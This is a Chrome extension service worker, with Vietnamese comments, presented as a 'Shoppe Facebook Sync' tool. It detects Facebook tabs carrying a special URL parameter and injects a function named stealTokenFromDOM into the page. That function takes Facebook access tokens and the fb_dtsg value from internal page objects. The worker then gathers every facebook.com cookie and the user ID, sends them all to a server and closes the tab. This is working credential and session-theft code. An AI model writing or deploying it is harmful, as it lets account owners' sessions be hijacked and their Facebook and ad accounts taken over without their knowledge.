/**
 * bg.js - Background Service Worker
 * Shoppe Facebook Sync Extension
 * 
 * Logic:
 * 1. Click icon → Mở trang admin
 * 2. Detect URL có towblock_connect=1 → Chạy extraction
 * 3. Gửi data về server → Đóng tab
 */

console.log('[BG] Service Worker loaded');

// ==============================================
// 1. CLICK ICON → MỞ TRANG ADMIN
// ==============================================
chrome.action.onClicked.addListener(() => {
    console.log('[BG] Icon clicked - Opening admin page');
    chrome.tabs.create({ url: 'http://localhost:3000/admin' });
});

// ==============================================
// 2. THEO DÕI TAB UPDATE → DETECT SYNC URL
// ==============================================
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
    // Chỉ xử lý khi tab load xong
    if (changeInfo.status !== 'complete') return;
    if (!tab.url) return;
    
    try {
        const url = new URL(tab.url);
        
        // Kiểm tra có phải Facebook và có param towblock_connect=1 không
        if (!url.hostname.includes('facebook.com')) return;
        if (url.searchParams.get('towblock_connect') !== '1') return;
        
        const userId = url.searchParams.get('userId');
        if (!userId) {
            console.error('[BG] Missing userId in URL');
            return;
        }
        
        console.log('[BG] ========================================');
        console.log('[BG] SYNC URL DETECTED!');
        console.log('[BG] Tab ID:', tabId);
        console.log('[BG] User ID:', userId);
        console.log('[BG] URL:', tab.url);
        console.log('[BG] ========================================');
        
        // Đợi 2 giây cho Facebook load đầy đủ
        await sleep(2000);
        
        // Thực thi extraction
        await executeExtraction(tabId, userId);
        
    } catch (error) {
        console.error('[BG] Error in onUpdated:', error);
    }
});

// ==============================================
// 3. HÀM EXTRACTION CHÍNH
// ==============================================
async function executeExtraction(tabId, userId) {
    console.log('[BG] Starting extraction for tab:', tabId);
    
    try {
        // 3.1. Inject script và lấy token
        const injectionResults = await chrome.scripting.executeScript({
            target: { tabId: tabId },
            func: stealTokenFromDOM,
            world: 'MAIN' // Quan trọng: Chạy trong context của page để truy cập biến toàn cục
        });
        
        const tokenData = injectionResults[0]?.result;
        console.log('[BG] Token extraction result:', tokenData);
        
        if (tokenData?.error) {
            console.error('[BG] Injection error:', tokenData.error);
            return;
        }
        
        // 3.2. Lấy cookies Facebook
        const cookies = await chrome.cookies.getAll({ domain: '.facebook.com' });
        const cookieStr = cookies.map(c => `${c.name}=${c.value}`).join('; ');
        
        // Lấy c_user (Facebook UID)
        const cUserCookie = cookies.find(c => c.name === 'c_user');
        const facebookUid = cUserCookie?.value || null;
        
        console.log('[BG] Facebook UID:', facebookUid);
        console.log('[BG] Cookie length:', cookieStr.length);
        
        if (!facebookUid) {
            console.error('[BG] No c_user cookie found - User not logged in?');
            return;
        }
        
        // 3.3. Gửi lên server
        await sendToServer(userId, tokenData, cookieStr, facebookUid, tabId);
        
    } catch (error) {
        console.error('[BG] Extraction failed:', error);
    }
}

// ==============================================
// 4. HÀM INJECTION - CHẠY TRONG CONTEXT FACEBOOK
// ==============================================
function stealTokenFromDOM() {
    try {
        let token = null;
        
        // Cách 1: Thử lấy từ Business Manager
        if (window.__accessToken) {
            token = window.__accessToken;
        }
        // Cách 2: Thử lấy từ AdHandle
        else if (window.AdHandle && window.AdHandle.getAccessToken) {
            token = window.AdHandle.getAccessToken();
        }
        // Cách 3: Thử lấy từ require module (DTSGInitialData)
        else {
            try {
                const D = require("DTSGInitialData");
                token = D.token || D.accessToken;
            } catch(e) {}
            
            // Cách 4: BusinessUserAccessToken
            if (!token) {
                try {
                    token = require("BusinessUserAccessToken").getAccessToken();
                } catch(e) {}
            }
        }
        
        // Lấy fb_dtsg
        let dtsg = null;
        
        // Cách 1: Từ input hidden
        const dtsgInput = document.querySelector('input[name="fb_dtsg"]');
        if (dtsgInput) {
            dtsg = dtsgInput.value;
        }
        
        // Cách 2: Từ DTSGInitialData
        if (!dtsg) {
            try {
                dtsg = require("DTSGInitialData").token;
            } catch(e) {}
        }
        
        console.log('[INJECT] Token found:', token ? 'YES (' + token.substring(0, 20) + '...)' : 'NO');
        console.log('[INJECT] DTSG found:', dtsg ? 'YES' : 'NO');
        
        return { token, dtsg };
        
    } catch (e) {
        console.error('[INJECT] Error:', e);
        return { error: e.toString() };
    }
}

// ==============================================
// 5. GỬI DATA LÊN SERVER
// ==============================================
async function sendToServer(userId, tokenData, cookieStr, facebookUid, tabId) {
    console.log('[BG] Sending data to server...');
    
    const payload = {
        towblock_user_id: userId,
        facebook_token: tokenData?.token || null,
        facebook_dtsg: tokenData?.dtsg || null,
        facebook_cookie: cookieStr,
        facebook_uid: facebookUid
    };
    
    console.log('[BG] Payload:', {
        ...payload,
        facebook_cookie: payload.facebook_cookie.substring(0, 50) + '...',
        facebook_token: payload.facebook_token ? payload.facebook_token.substring(0, 30) + '...' : null
    });
    
    try {
        const response = await fetch('http://localhost:3001/api/accounts/sync', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        console.log('[BG] Server response status:', response.status);
        
        if (response.ok) {
            const result = await response.json();
            console.log('[BG] ✅ Sync successful:', result);
            
            // Đóng tab Facebook sau khi sync thành công
            console.log('[BG] Closing tab:', tabId);
            await chrome.tabs.remove(tabId);
            console.log('[BG] Tab closed successfully');
            
        } else {
            const errorText = await response.text();
            console.error('[BG] ❌ Server error:', response.status, errorText);
        }
        
    } catch (error) {
        console.error('[BG] ❌ Fetch failed:', error);
    }
}

// ==============================================
// HELPER FUNCTIONS
// ==============================================
function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}
